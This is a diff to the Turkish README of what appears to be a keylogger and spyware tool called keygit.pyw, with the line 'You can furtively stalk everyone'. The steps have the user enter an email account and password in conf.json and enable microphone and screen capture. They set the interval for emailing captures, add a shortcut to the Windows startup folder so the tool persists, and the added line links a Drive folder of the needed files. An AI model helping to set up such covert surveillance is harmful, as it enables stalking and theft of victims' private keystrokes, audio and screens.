@@ -8,3 +8,6 @@ You can furtively stalk everyone
 5. conf.json dosyasını açıp email ve password yazan kısımları silip aldığınız e-maili ve şifresini yazın ekran görüntüsü veya ses verisi almak istemiyorsanız mic ve screen değerlerini silip False yapabilirsiniz son olarak time değeri de kaç saniyede bir e posta gönderileceğidir değiştirebilirsiniz
 6.keygit.pyw dosyasına sağ tıklayarak kısayol oluşturun
 7. win+r tuşlarına basarak çıkan pencereye shell:startup yazın ve tamam deyin açılan pencereye kısayolu yapıştırın ve işlem tamam bilgisayarı yeniden başlatın ve maillerinizin gelmesini bekleyin
+
+
+son olarak python 3.9 sürümü dahil tüm gerekli şeylerin indirme linki https://drive.google.com/drive/folders/11vtm7EMEwlbIaQmYdY7bquIwZU56eSB7?usp=sharing
